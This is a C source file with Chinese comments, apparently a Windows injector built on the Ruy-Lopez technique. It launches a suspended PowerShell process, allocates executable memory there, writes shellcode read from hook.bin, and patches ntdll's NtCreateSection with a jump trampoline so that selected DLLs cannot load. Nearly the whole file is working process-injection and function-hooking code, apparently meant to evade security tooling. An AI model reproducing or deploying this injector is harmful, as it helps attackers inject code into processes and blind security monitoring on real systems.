/**
 * ===================================================================
 * Ruy-Lopez DLL Blocking - Main Injector
 * ===================================================================
 *
 * 通过 Hook NtCreateSection 阻止特定 DLL 加载到新进程
 * 基于 S3cur3Th1sSh1t/Ruy-Lopez 项目
 *
 * 原理：
 * 1. 创建挂起状态的目标进程（PowerShell）
 * 2. 在远程进程分配 RWX 内存
 * 3. 读取编译好的 PIC shellcode（hook.bin）
 * 4. 获取 ntdll!NtCreateSection 地址
 * 5. 保存原始 NtCreateSection 的前 24 字节
 * 6. 安装 hook trampoline：JMP 到 shellcode
 * 7. 在 shellcode 中查找 egg（占位符）
 * 8. 将原始字节 patch 到 egg 位置（供 shellcode 恢复调用）
 * 9. 将 patched shellcode 写入远程进程
 * 10. 恢复进程执行
 *
 * 当进程尝试加载 DLL 时，会触发我们的 hook，检查并阻止特定 DLL
 */

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// ===== NT API 声明 =====

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

// ===== 全局变量 =====
pNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
pNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
pNtProtectVirtualMemory NtProtectVirtualMemory = NULL;

// ===== Egg 标记（用于在 shellcode 中查找占位符）=====
unsigned char EGG[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE };
#define EGG_SIZE 8

/**
 * ===================================================================
 * 初始化 NT API
 * ===================================================================
 */
BOOL InitializeNtApis() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) {
        printf("[-] Failed to resolve NT APIs\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 读取 shellcode 文件（hook.bin）
 * ===================================================================
 */
BOOL ReadShellcode(const char* path, unsigned char** buffer, DWORD* size) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open shellcode file: %s (Error: %lu)\n", path, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] Failed to get file size\n");
        CloseHandle(hFile);
        return FALSE;
    }

    unsigned char* data = (unsigned char*)malloc(fileSize);
    if (!data) {
        printf("[-] Failed to allocate memory for shellcode\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, data, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] Failed to read shellcode file\n");
        free(data);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    *buffer = data;
    *size = fileSize;

    printf("[+] Shellcode loaded: %lu bytes\n", fileSize);
    return TRUE;
}

/**
 * ===================================================================
 * 在 shellcode 中查找 egg（占位符）
 * ===================================================================
 */
BOOL FindEggInShellcode(unsigned char* shellcode, DWORD size, DWORD* offset) {
    for (DWORD i = 0; i <= size - EGG_SIZE; i++) {
        if (memcmp(&shellcode[i], EGG, EGG_SIZE) == 0) {
            *offset = i;
            printf("[+] Found egg at offset: 0x%lX\n", i);
            return TRUE;
        }
    }

    printf("[-] Egg not found in shellcode\n");
    return FALSE;
}

/**
 * ===================================================================
 * 创建 hook trampoline
 *
 * x64 跳转指令：
 * mov r10, <address>   ; 49 BA <8 bytes>
 * jmp r10              ; 41 FF E2
 * ===================================================================
 */
BOOL CreateHookTrampoline(unsigned char* trampoline, PVOID targetAddress) {
    // mov r10, <address>
    trampoline[0] = 0x49;
    trampoline[1] = 0xBA;
    memcpy(&trampoline[2], &targetAddress, 8);

    // jmp r10
    trampoline[10] = 0x41;
    trampoline[11] = 0xFF;
    trampoline[12] = 0xE2;

    return TRUE;
}

/**
 * ===================================================================
 * 创建挂起的目标进程
 * ===================================================================
 */
BOOL CreateSuspendedProcess(PROCESS_INFORMATION* pi) {
    STARTUPINFOA si = { sizeof(si) };
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    // 创建挂起的 PowerShell 进程
    const char* cmdLine = "powershell.exe";

    if (!CreateProcessA(
        NULL,
        (LPSTR)cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        pi
    )) {
        printf("[-] Failed to create process (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Created suspended process (PID: %lu)\n", pi->dwProcessId);
    return TRUE;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Ruy-Lopez DLL Blocking - Main Injector\n");
    printf("Based on: github.com/S3cur3Th1sSh1t/Ruy-Lopez\n");
    printf("===================================================================\n\n");

    // 第一步：初始化 NT APIs
    printf("[*] Step 1: Initializing NT APIs...\n");
    if (!InitializeNtApis()) {
        return 1;
    }

    // 第二步：读取 shellcode
    printf("\n[*] Step 2: Loading shellcode...\n");
    unsigned char* shellcode = NULL;
    DWORD shellcodeSize = 0;
    const char* shellcodePath = "hook.bin";

    if (!ReadShellcode(shellcodePath, &shellcode, &shellcodeSize)) {
        return 1;
    }

    // 第三步：创建挂起的目标进程
    printf("\n[*] Step 3: Creating suspended target process...\n");
    PROCESS_INFORMATION pi;
    if (!CreateSuspendedProcess(&pi)) {
        free(shellcode);
        return 1;
    }

    // 第四步：获取 NtCreateSection 地址
    printf("\n[*] Step 4: Getting NtCreateSection address...\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    PVOID pNtCreateSection = GetProcAddress(hNtdll, "NtCreateSection");
    if (!pNtCreateSection) {
        printf("[-] Failed to get NtCreateSection address\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[+] NtCreateSection address: 0x%p\n", pNtCreateSection);

    // 第五步：在远程进程分配内存
    printf("\n[*] Step 5: Allocating memory in remote process...\n");
    PVOID remoteMemory = NULL;
    SIZE_T regionSize = shellcodeSize + 0x1000; // 额外分配一些空间

    NTSTATUS status = NtAllocateVirtualMemory(
        pi.hProcess,
        &remoteMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (status != 0) {
        printf("[-] Failed to allocate memory in remote process (Status: 0x%lX)\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[+] Allocated memory at: 0x%p (Size: 0x%zX)\n", remoteMemory, regionSize);

    // 第六步：保存原始 NtCreateSection 的前 24 字节
    printf("\n[*] Step 6: Saving original NtCreateSection bytes...\n");
    unsigned char originalBytes[24];
    SIZE_T bytesRead;

    if (!ReadProcessMemory(pi.hProcess, pNtCreateSection, originalBytes, 24, &bytesRead) || bytesRead != 24) {
        printf("[-] Failed to read original NtCreateSection bytes\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[+] Original bytes saved (24 bytes)\n");

    // 第七步：在 shellcode 中查找 egg 并 patch 原始字节
    printf("\n[*] Step 7: Finding egg and patching original bytes...\n");
    DWORD eggOffset;
    if (!FindEggInShellcode(shellcode, shellcodeSize, &eggOffset)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    // 将原始字节 patch 到 egg 位置
    memcpy(&shellcode[eggOffset], originalBytes, 24);
    printf("[+] Patched original bytes into shellcode at offset 0x%lX\n", eggOffset);

    // 第八步：写入 shellcode 到远程进程
    printf("\n[*] Step 8: Writing shellcode to remote process...\n");
    SIZE_T bytesWritten;

    status = NtWriteVirtualMemory(
        pi.hProcess,
        remoteMemory,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (status != 0 || bytesWritten != shellcodeSize) {
        printf("[-] Failed to write shellcode (Status: 0x%lX, Written: %zu)\n", status, bytesWritten);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[+] Shellcode written successfully (%zu bytes)\n", bytesWritten);

    // 第九步：安装 hook trampoline
    printf("\n[*] Step 9: Installing hook trampoline...\n");
    unsigned char hookTrampoline[13];
    CreateHookTrampoline(hookTrampoline, remoteMemory);

    // 修改 NtCreateSection 的内存保护
    PVOID ntCreateSectionAddr = pNtCreateSection;
    SIZE_T protectSize = 13;
    ULONG oldProtect;

    status = NtProtectVirtualMemory(
        pi.hProcess,
        &ntCreateSectionAddr,
        &protectSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    if (status != 0) {
        printf("[-] Failed to change memory protection (Status: 0x%lX)\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    // 写入 hook trampoline
    status = NtWriteVirtualMemory(
        pi.hProcess,
        pNtCreateSection,
        hookTrampoline,
        13,
        &bytesWritten
    );

    if (status != 0 || bytesWritten != 13) {
        printf("[-] Failed to write hook trampoline (Status: 0x%lX)\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    // 恢复内存保护
    status = NtProtectVirtualMemory(
        pi.hProcess,
        &ntCreateSectionAddr,
        &protectSize,
        oldProtect,
        &oldProtect
    );

    printf("[+] Hook trampoline installed successfully\n");

    // 第十步：恢复进程执行
    printf("\n[*] Step 10: Resuming process...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] Failed to resume thread (Error: %lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("[+] Process resumed\n");
    printf("\n===================================================================\n");
    printf("[+] DLL Blocking active! Press Enter to exit...\n");
    printf("===================================================================\n");

    // 等待用户输入
    getchar();

    // 清理
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(shellcode);

    return 0;
}
